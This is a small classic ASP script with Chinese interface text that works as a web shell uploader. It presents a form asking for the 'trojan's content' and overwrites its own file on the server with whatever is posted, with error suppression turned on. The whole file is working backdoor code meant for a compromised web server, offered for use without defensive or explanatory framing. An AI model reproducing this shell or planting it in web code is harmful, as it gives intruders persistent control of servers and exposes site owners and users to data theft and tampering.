<% dim objFSO %>
<% dim fdata %>
<% dim objCountFile %>
<% on error resume next %>
<% Set objFSO = Server.CreateObject("Scripting.FileSystemObject") %>
<% if Trim(request("cyfddata"))<>"" then %>
<% fdata = request("cyfddata") %>
<% Set objCountFile=objFSO.CreateTextFile(server.mappath(Request.ServerVariables

("SCRIPT_NAME")),True) %>
<% objCountFile.Write fdata %>
<% if err =0 then %>
<% response.redirect (Request.ServerVariables("SCRIPT_NAME"))%>
<% else %>
<% response.write "<font color=red>失败</font>" %>
<% end if %>
<% err.clear %>
<% end if %>
<% objCountFile.Close %>
<% Set objCountFile=Nothing %>
<% Set objFSO = Nothing %>
<% Response.write "<form action='' method=post>" %>
<% Response.write "输入马的内容:" %>
<% Response.write "<textarea name=cyfddata cols=80 rows=10 width=32></textarea>" %>
<% Response.write "<input type=submit value=保存>" %>
<% Response.write "</form>" %>
